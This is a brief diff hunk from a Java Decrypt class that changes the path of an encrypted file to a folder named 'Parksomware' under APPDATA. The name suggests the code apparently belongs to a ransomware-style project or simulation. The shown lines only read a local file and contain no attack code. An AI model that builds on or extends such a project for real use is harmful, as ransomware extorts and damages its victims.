@@ -13,7 +13,7 @@ import java.util.Scanner;
 public class Decrypt {
 
     public static void runDecryption() throws Exception {
-        File encryptFile = new File(System.getenv("APPDATA") + "\\encrypted.txt");
+        File encryptFile = new File(System.getenv("APPDATA") + "\\Parksomware\\encrypted.txt");
         List<String> lines = readLines(encryptFile);
 
         if (lines.size() < 2) {
